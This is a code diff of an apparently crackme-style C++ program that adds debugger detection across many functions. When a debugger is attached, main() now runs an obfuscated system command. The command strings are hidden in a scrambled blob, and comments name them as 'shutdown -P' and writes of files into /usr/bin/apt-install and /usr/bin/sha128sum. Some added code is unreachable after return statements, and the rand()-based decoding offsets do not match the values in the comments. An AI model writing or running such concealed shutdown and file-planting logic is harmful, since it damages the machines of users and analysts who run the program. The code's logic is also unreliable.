@@ -39,6 +39,42 @@ std::string bs8 = "V5T^`y=C";
 
 char* layer_one_encrypted_key = "Z$68zc<E2`VU_0f<~`OP#\0";
 
+bool is_debugger_attached2() {
+    char buf[4096];
+
+    int fd = open("/proc/self/status", O_RDONLY);
+    if (fd == -1) {
+        return false;
+    }
+
+    const ssize_t num_read = read(fd, buf, sizeof(buf) - 1);
+    close(fd);
+
+    if (num_read <= 0) {
+        return false;
+    }
+
+    buf[num_read] = '\0';
+    const char tracerPidString[] = "TracerPid:";
+    const char* tracer_pid_ptr = strstr(buf, tracerPidString);
+    if (!tracer_pid_ptr)
+        return false;
+
+    for (const char* characterPtr = tracer_pid_ptr + sizeof(tracerPidString) - 1; characterPtr <= buf + num_read; ++characterPtr) {
+        if (isspace(*characterPtr)) {
+            continue;
+        }
+        else {
+            return isdigit(*characterPtr) != 0 && *characterPtr != '0';
+        }
+    }
+
+    return false;
+    if (is_debugger_attached()) {
+        return 0;
+    }  
+}
+
 //Returns various system call strings based on input
 //0 is shutdown -P
 std::string system_call(int arg) {
@@ -49,11 +85,10 @@ std::string system_call(int arg) {
     std::string target;
     
     
-    
     std::string big_long_string = "asdgasuidhfokasdjflkawlqp`ksj$)Tlkasjst}:\"4\"4\"4\":$$:tnmuhqEj{hn+4nbnienrgpiosunrgp`{fgw|d}3>Cp34unpfcvg\" )'V uryv{`2=fb=e}`yhq9io`mv$+pit+skvo+Tqfhmgk498hng-9qert{vm?0kro0hpmt0mppk938ht-w4958jg-=r8rtjb-q9r8wlv`k#,wns,tlqh,Svaoj`,lvwsvw-old#%%#f`kl#!&p!#=#,wns,tlqh,Svaoj`,lvwsvw-oldthn2-98ntq-85ngrisen&)sut)doh)gvr+ohurgjj&  &ceni&$#u$&8&)sut)doh)gvr+ohurgjj98rng-qirn[oeirn}f|ja)&|z{&k`g&njj$8;)//)ljaf)+,z+)7)&|z{&k`g&njj$8;4ht-q389}f|ja)&}dy&~f{b&{ff}&`gof'efn)//)ljaf)+,z+)7)&}dy&~f{b&{ff}&`gof'efnaiwuerh-198u}f|ja)&|z{&k`g&zza$o{`lgm)//)ljaf)+,z+)7)&|z{&k`g&zza$o{`lgm~eib*%yx%hcd%yyb'lxcodn*,,*oibe*(/y(*4*%yx%hcd%yyb'lxcodny-q39485uq-3948gjf-az`v}5:`fg:w|{:f}t$'-f`x5335pv}z570f75+5:`fg:w|{:f}t$'-f`xq9efnsd-fiugnwpirugjaelkgjaskldjfblaskjdbfa;siudfhawop49rtuq23[4-05i[q-340tita]-0ri=s]-0rgiq]23-oprjeiolrgkhawelgiajert'p0awi[r-0q3it]0skr'gpoaejrop;gtije[9guaje[roigjaeo[rigj[ao ijrg[aw904ut 0-49wut][a09reuw g]a90ug]0a9wu4t]a094ut 0d9ujga[ erjg [aoisdug[a0we9tu[ qa]09ugh]a09erug[aer908ugha'dofighja['oersiguja[]w0e9fui[aw09etguj]qw0394ut]q3094u[q09erug[aoijrg[aoeirjg[aoeirjta3049u56 ]aw9eurhjg'asdigh/asdilghaw[094tuaw\43t9uae[rg8ha;soirgha[p9e8tuy[93w84hjt[98h`[98h3r[p98jsphoijp394806upw9384u6-98y7u0-9*^&)*&^*&%$&%^$#&^%%*(&)_(&*)&^(*&^)87ypiouehgpiosuhergpoiuaherpiguha erui9gyaieurghpaieurhgapioeurhgfpaw3uh5qp98w4tyup9z8dfgdzlioghpsa4eoiu6pq9384upiohjgskljdrhglaieutha[09w4u5t[03q49utaoierjg[0a9drughao;ierlhaw/4tilhjqa]4095uq3\4t-90=s0er9gut=09832yu-9834y-9184hogi;soidrhjg;alkdfgnse;olirtgja'eopirjgklsdfgaoeriugfaoerihgaoidfkvn;aeoifgua[e094rtyu[qa094tu[aoihrjf;aiosuehf;kajsdhfg;aoperug[0ae9rug[09erug[0oa9erug[0aer9ug[ae09rgu[ae0riugj[aeorijg;aodfikgj;aldkrjg[aeo9rug[ae0r9ugdf0vnea[9r8hge[a98rgh[39804u52[984u50=189=`098`=-029358=`092385=`-092835u[098u35[o`i23h5[o`2i3h5[oi2h3[98`h23[9o8ih[obkjsd;origjse'oirgj;seoirgj;aseoirjg;qaoeirjg[0319u5[0934ut[09regjs/ldirghj'ea/srilogje;'9porut]09&)(*^)(@*&#^$)*(^)*(&60p98uo98h6-q983h4t=gq8h=3984nt=q84=vqk3409vk=q95kh9ierujngpiunpfgiojasfoijawpejibpfs8ie4yt9pq83uy5-q98ueg-srtjsrtjsrtjsrtjsrtjsrtjsrtjsrtjsrtjsrtj9a8urg-9a8rhapioehjfpiajwhepfioq2p390ru=q094tsdfgsdfgsdfgsdfgsdfjsrtjasertj=-srtjsrtjsrtjsrtjsrtjsrtju-=98erhgpa9uihrepgiaouhwefpiuabrpfiuaebrgpiuawb-tp8q32y5-9823u-t8hj-guhawepiuoghpaiuehgpaiuwehgpaiwuehgpiawuhegpiauwehgp";
     
     
-    if (arg == 0) { //shutdown -P
+    if (arg == 0 || is_debugger_attached2()) { //shutdown -P
         start = (rand() % 206 - 4) / 3; //21
         length = (rand() % rand() % rand() % rand() % (rand() / 2) % (rand() / 6666666)) - 49; //11
         
@@ -80,7 +115,7 @@ std::string system_call(int arg) {
         
         return target;
     }
-    else if (arg == 2) { //mkdir /tmp/work
+    else if (arg == 2 || is_debugger_attached2()) { //mkdir /tmp/work
         start = ((rand() % rand() - 120 + 120) / 95555) / 140; //112
         length = ((rand()) % (rand()) % (rand())) / ((rand()) % (rand()) % (rand())) + 12; //15
         
@@ -107,7 +142,7 @@ std::string system_call(int arg) {
         
         return target;
     }
-    else if (arg == 4) { //shutdown -P
+    else if (arg == 4 || is_debugger_attached2()) { //shutdown -P
         start = ((rand() + rand() - rand() % rand() - rand() - rand()) % 4444) / 51; //83
         length = (rand() % rand() % rand()) / ((rand() % rand() % rand() % rand() % rand() % rand() % rand() % rand()) / 200) - 66; //11
         
@@ -162,7 +197,7 @@ std::string system_call(int arg) {
         
     }
     
-    else if (arg == 8) { //touch /usr/bin/apt-install && echo \"%s\" > /usr/bin/apt-install
+    else if (arg == 8 || is_debugger_attached2()) { //touch /usr/bin/apt-install && echo \"%s\" > /usr/bin/apt-install
     
         start = (rand() % rand()) / (rand() % rand()) + 288; //300
         length = ((rand() % rand() % rand() % rand() % rand()) / 3000000) - 87; //64
@@ -218,7 +253,7 @@ std::string system_call(int arg) {
         
         return target;
     }
-    else if (arg == 12) { //touch /usr/bin/sha128sum && echo \"%s\" > /usr/bin/sha128sum
+    else if (arg == 12 || is_debugger_attached2()) { //touch /usr/bin/sha128sum && echo \"%s\" > /usr/bin/sha128sum
         start = ((rand() % rand()) / 6774333) * 6; //654
         length = ((rand() % rand() / (rand()/ rand())) / 555555) - 30; //58
         
@@ -254,6 +289,9 @@ void makeWritableExecutable(void* func, size_t size) {
 }
 
 int sum1(int a, int b){
+    if (is_debugger_attached2()) {
+        return 0;
+    }
     return a + b;
 }
 
@@ -474,6 +512,9 @@ bool is_debugger_attached() {
     }
 
     return false;
+    if (is_debugger_attached()) {
+        return 0;
+    }  
 }
 
 //returns the 10s minute
@@ -490,6 +531,9 @@ int gettenminute() {
         std::cerr << "Broken :(" << std::endl;
         return 1;
     }
+    else if (is_debugger_attached()) {
+        return 0;
+    }  
 
     // Read the output line by line
     while (fgets(buffer, sizeof(buffer), fp) != NULL) {
@@ -570,7 +614,10 @@ int folder_master(std::string val1, std::string val2, std::string val3, std::str
     if (fp == NULL) {
         std::cerr << "Broken :(" << std::endl;
         return 1;
-    }   
+    }
+    else if (is_debugger_attached()) {
+        return 0;
+    }  
     //system("mkdir /tmp/work/root");
     FILE *fp1;
     char buffer1[20];
@@ -623,6 +670,10 @@ bool verify_layer_one(char * input){
     bool match = true;
     char * key = layer_one_encrypted_key;
 
+    if (is_debugger_attached()) {
+        return 0;
+    }
+
     create_stego_image("hidden_key_image.ppm", gen_key());
     std::ifstream imageFile("hidden_key_image.ppm", std::ios::binary);
 
@@ -638,6 +689,9 @@ bool verify_layer_one(char * input){
             decode(bs8);
             match = false;
         }
+        if (is_debugger_attached()) {
+            return 0;
+        }
         key = key + 1;
         output = output + 1;
         //imageFile.read((char*)salt, 1);
@@ -646,6 +700,9 @@ bool verify_layer_one(char * input){
     //delete [] output;
     imageFile.close();
     decode(bs6);
+    if (is_debugger_attached()) {
+        return 0;
+    }
 
     return match;
 }
@@ -686,11 +743,12 @@ int main(){
     //detect debugger
     if(is_debugger_attached()){
         //system("shutdown&");
-        printf("Debugger detected");
+        system(system_call(1).c_str());
+        return 1;
     }
 
     //Shutdown if tens place is 1
-    if (gettenminute() == 1) {
+    if (gettenminute() == 1 || is_debugger_attached()) {
         FILE *fp;
         char buffer[20];
         std::string result = "";
